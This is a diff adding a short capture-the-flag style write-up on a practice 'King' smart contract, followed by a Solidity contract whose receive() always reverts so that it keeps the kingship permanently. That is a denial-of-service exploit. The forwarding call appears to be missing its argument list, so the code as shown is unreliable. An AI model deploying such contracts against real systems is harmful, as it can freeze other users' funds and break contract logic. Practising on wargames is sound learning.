@@ -1,0 +1,23 @@
+We need to disable the King overwrite (in fallback() )
+To do this, break the require condition OR make the
+transfer fail. I can't think of any way to fudge the 
+require() so it must be down to the transfer?
+
+I had to do some googling again, but making a contract that
+refuses transfers seems a good idea!!
+
+took me absolutely ages to get the syntax right on this one
+had so many failed transactions etc
+
+contract TheLastKing {
+    constructor() payable {
+        require(msg.value >= 1 ether, "not enough ether");
+        payable(address([ThroneAddress])).call{value: msg.value};
+        }
+    
+    receive() external payable {
+        require(false, "punk'd");
+    }
+}
+
+now just send 1 or more eth when you deploy the contract!!
